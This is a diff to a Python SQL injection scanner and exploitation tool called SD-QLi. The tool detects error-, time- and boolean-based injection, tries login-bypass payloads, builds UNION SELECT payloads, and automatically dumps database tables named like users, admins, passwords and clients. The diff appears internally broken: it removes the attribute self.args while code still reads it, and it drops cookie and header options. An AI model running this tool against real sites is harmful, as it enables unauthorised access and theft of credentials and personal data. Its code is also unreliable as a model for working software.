@@ -1,4 +1,9 @@
 #!/usr/bin/env python3
+"""
+SD-QLi v1.1: ADVANCED AUTOMATED SQLi SCANNER
+High-speed SQL injection scanner and automated exploitation framework.
+Designed for rapid enumeration and professional vulnerability discovery.
+"""
 
 import requests
 import time
@@ -23,13 +28,12 @@ class Colors:
     END = '\033[0m'
 
 class SDQLi:
-    def __init__(self, url, method='GET', data=None, headers=None, workers=10, timeout=3, args=None):
+    def __init__(self, url, method='GET', data=None, headers=None, workers=10, timeout=3):
         self.url = url
         self.method = method.upper()
         self.data = data # POST data as string or dict
         self.max_workers = workers
         self.timeout = timeout
-        self.args = args
         
         self.session = requests.Session()
         if headers:
@@ -199,8 +203,11 @@ class SDQLi:
                                     self.results['vulnerabilities'].append(vuln)
                                     print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db_type} Error-based{Colors.END}")
                                     
-                                    proof = f"curl -i \"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}\""
-                                    ResultsLogger.log_finding("SD-QLi", f"{db_type} Error-based SQLi", self.url, proof)
+                                    # Centralized Logging for Industrial Report
+                                    proof = f"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={current_params[param_name]}\" {self.url}"
+                                    ResultsLogger.log_finding("SD-QLi", f"{db_type} SQLi (Error)", self.url, proof, 
+                                                             vector=f"Parameter: {param_name}", 
+                                                             description=f"Error-based SQL Injection detected in '{param_name}' parameter.")
                             return True
             except: pass
             finally: current_params[param_name] = original_val
@@ -247,8 +254,11 @@ class SDQLi:
                             self.results['vulnerabilities'].append(vuln)
                             print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db} Time-based{Colors.END}")
                             
-                            proof = f"curl -i \"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}\""
-                            ResultsLogger.log_finding("SD-QLi", f"{db} Time-based SQLi", self.url, proof)
+                            # Centralized Logging for Industrial Report
+                            proof = f"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={current_params[param_name]}\" {self.url}"
+                            ResultsLogger.log_finding("SD-QLi", f"{db} SQLi (Time)", self.url, proof, 
+                                                     vector=f"Parameter: {param_name}", 
+                                                     description=f"Time-based (Blind) SQL Injection detected in '{param_name}' parameter. Server delayed response by {elapsed:.2f}s.")
                         return True
                 except: pass
                 finally: current_params[param_name] = original_val
@@ -281,8 +291,11 @@ class SDQLi:
                         self.results['vulnerabilities'].append(vuln)
                         print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}Boolean-blind{Colors.END}")
                         
-                        proof = f"curl -i \"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}\""
-                        ResultsLogger.log_finding("SD-QLi", "Boolean-blind SQLi", self.url, proof)
+                        # Centralized Logging for Industrial Report
+                        proof = f"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={current_params[param_name]}\" {self.url}"
+                        ResultsLogger.log_finding("SD-QLi", "Boolean SQLi (Blind)", self.url, proof, 
+                                                 vector=f"Parameter: {param_name}", 
+                                                 description=f"Boolean-based blind SQL Injection detected in '{param_name}' parameter via response length differential.")
                     return True
             except: pass
             finally: current_params[param_name] = original_val
@@ -290,7 +303,7 @@ class SDQLi:
         return False
 
     def check_login_bypass(self, params):
-        """Aggressive Mode v1.6: Tests for authentication bypass with Negative Detection"""
+        """Aggressive Mode v1.7: Tests for authentication bypass with Negative Detection"""
         if self.method != 'POST': return 
         print(f"[*] {Colors.BOLD}Aggressive Bypass Phase{Colors.END}: Learning failed login behavior...")
         
@@ -336,14 +349,13 @@ class SDQLi:
                     r = self.session.post(self.url, data=test_params, timeout=self.timeout, allow_redirects=False)
                     
                     # Logic A: Redirect (Classical)
-                    is_success = r.status_code in [301, 302, 303, 307, 308]
+                    is_redirect = r.status_code in [301, 302, 303, 307, 308]
                     # Logic B: Keyword Match
                     success_keywords = ['dashboard', 'welcome', 'logout', 'admin', 'profile', 'manage', 'account']
-                    is_success = is_success or any(word in r.text.lower() for word in success_keywords)
+                    is_success = is_redirect or any(word in r.text.lower() for word in success_keywords)
                     
                     # Logic C: Negative Detection (Error message disappearance)
                     if not is_success and identified_errors:
-                        # If the identified error keyword is GONE, it's likely a bypass
                         if all(word not in r.text.lower() for word in identified_errors):
                             is_success = True
                     
@@ -352,6 +364,10 @@ class SDQLi:
                             self.results['login_bypass'] = True
                             self.results['bypass_payload'] = payload
                             print(f" {Colors.GREEN}[+]{Colors.END} {Colors.BOLD}Bypass Success!{Colors.END} Payload: {Colors.YELLOW}{payload}{Colors.END}")
+                            
+                            description = f"Authentication bypass successful using SQL Injection payload: {payload}. The application failed to properly sanitize form fields."
+                            ResultsLogger.log_finding("SD-QLi", "Login Bypass", self.url, f"Payload: {payload}", 
+                                                     vector="Form Parameter Injection", description=description)
                         return True
                 except: pass
         return False
@@ -464,6 +480,15 @@ class SDQLi:
                     print(f"  {Colors.YELLOW}[*]{Colors.END} {label}: {Colors.BOLD}Extraction hidden/filtered{Colors.END}")
             except: pass
 
+        # Centralized Logging for UNION exfiltration
+        u_p = [f"'{i}'" for i in range(1, column_count + 1)]
+        u_p[ref_idx-1] = "@@version"
+        u_payload = f"99999' UNION SELECT {','.join(u_p)}-- -"
+        proof = f"{self.url}?{param_name}={urllib.parse.quote(u_payload)}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={u_payload}\" {self.url}"
+        ResultsLogger.log_finding("SD-QLi", "UNION-based SQLi", self.url, proof, 
+                                 vector=f"Parameter: {param_name}", 
+                                 description=f"Full data exfiltration possible via UNION-based SQL Injection in '{param_name}'. Extracted version: {self.results.get('version', 'N/A')}")
+
         # 4. Automated Full Schema Discovery (New v2.3)
         print(f"[*] Starting full schema exfiltration...")
         self.automate_harvest(param_name, current_params, column_count, ref_idx, prefix=prefix)
@@ -473,11 +498,9 @@ class SDQLi:
         current_params[param_name] = original_val
 
     def automate_harvest(self, param_name, current_params, col_count, ref_idx, prefix=None):
-        """Recursive Global Harvesting (v2.6)"""
-        if not self.args: return
-
+        """Recursive Global Harvesting (v2.8 - Merged Heuristics)"""
         # Prioritize CLI flags (Targeted mode)
-        if any([self.args.dbs, self.args.tables, self.args.columns, self.args.dump]):
+        if self.args and any([self.args.dbs, self.args.tables, self.args.columns, self.args.dump]):
             if self.args.dbs: self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
             if self.args.tables:
                 db = self.args.db or self.results['database'] or "current"
@@ -490,7 +513,7 @@ class SDQLi:
                 else: self.dump_table(param_name, current_params, col_count, ref_idx, self.args.table, cols=self.args.col.split(',') if self.args.col else None, db=self.args.db, prefix=prefix)
             return
 
-        # Global Full-Auto Mode (v2.6 Recursion)
+        # Global Full-Auto Mode (v2.8 Recursion)
         print(f"[*] {Colors.BOLD}Global Recursion{Colors.END}: Harvesting all databases...")
         self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
         
@@ -504,13 +527,12 @@ class SDQLi:
             print(f"\n[*] Processing Database: {Colors.BOLD}{Colors.CYAN}{db}{Colors.END}")
             tables = self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
             
-            # v2.6 Smart-Dump Heuristic (All databases)
+            # v2.8 Smart-Dump Heuristic (All databases)
             interesting_keywords = ['user', 'staff', 'admin', 'account', 'member', 'login', 'pass', 'detail', 'client']
             for table in tables:
                 if any(k in table.lower() for k in interesting_keywords):
                     print(f"[*] {Colors.GREEN}Identifying High-Value table{Colors.END}: {Colors.BOLD}{table}{Colors.END}")
                     self.dump_table(param_name, current_params, col_count, ref_idx, table, db=db, prefix=prefix)
-                    # Don't break here in v2.6, dump all interesting tables in the DB
 
     def blind_manager(self, param_name, current_params):
         """Manages Time-based Blind exfiltration (v2.3 Robust)"""
@@ -665,7 +687,7 @@ class SDQLi:
         return []
 
     def dump_table(self, param_name, current_params, col_count, ref_idx, table, cols=None, db=None, prefix=None):
-        """Dumps data from a table (Industrial-grade)"""
+        """Dumps data from a table (Industrial-grade with 20-record limit)"""
         if not cols: 
             cols = self.get_columns(param_name, current_params, col_count, ref_idx, table, db, prefix)
         if not cols: return
@@ -856,9 +878,6 @@ def main():
     parser.add_argument('-r', '--request', help='Raw request file (Burp-style)')
     parser.add_argument('-w', '--workers', type=int, default=10, help='Number of threads')
     parser.add_argument('-t', '--timeout', type=int, default=3, help='Request timeout')
-    parser.add_argument('-e', '--encode', choices=['none', 'all'], default='none', help='Global encoding')
-    parser.add_argument('--cookie', help='Custom cookie')
-    parser.add_argument('--header', action='append', help='Custom headers')
     
     # Enumeration Flags (v2.3)
     parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
@@ -869,19 +888,10 @@ def main():
     parser.add_argument('-T', dest='table', help='Table to enumerate')
     parser.add_argument('-C', dest='col', help='Columns to enumerate (comma-sep)')
     
+    global args
     args = parser.parse_args()
     
-    headers = {}
-    if args.header:
-        for head in args.header:
-            try:
-                k, v = head.split(':', 1)
-                headers[k.strip()] = v.strip()
-            except: pass
-            
-    if args.cookie:
-        headers['Cookie'] = args.cookie
-
+    headers = None
     url = args.url
     method = args.method
     data = args.data
@@ -901,7 +911,7 @@ def main():
         parser.print_help()
         sys.exit(1)
     
-    scanner = SDQLi(url, method=method, data=data, headers=headers, workers=args.workers, timeout=args.timeout, args=args)
+    scanner = SDQLi(url, method=method, data=data, headers=headers, workers=args.workers, timeout=args.timeout)
     try:
         scanner.run()
     except KeyboardInterrupt:
